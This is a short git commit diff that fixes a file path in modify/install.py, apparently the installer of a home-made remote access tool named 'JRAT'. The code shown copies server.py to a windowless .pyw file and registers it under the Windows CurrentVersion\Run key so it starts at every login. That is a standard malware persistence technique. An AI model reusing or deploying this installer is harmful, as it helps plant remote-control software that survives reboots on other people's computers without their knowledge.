db2ab58a9ae0dd99cc538cb2729d63bbb77b2bdd
Jackson <ibjacksonc@hotmail.com>
2017-03-01 14:35:37 +1300

    fix path error

--- modify/install.py
+++ modify/install.py
@@ -8,7 +8,7 @@ try:
 except FileExistsError:
     pass
 with open(path+'{0}server.pyw'.format(os.path.sep), 'w') as file:
-    file.write(open(os.path.abspath('./server.py'), 'r').read())
+    file.write(open(os.path.abspath('././server.py'), 'r').read())
 
 run = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run', 0, winreg.KEY_WRITE)
 winreg.SetValueEx(run,"JRAT",0,winreg.REG_SZ,path+'{0}server.pyw'.format(os.path.sep))
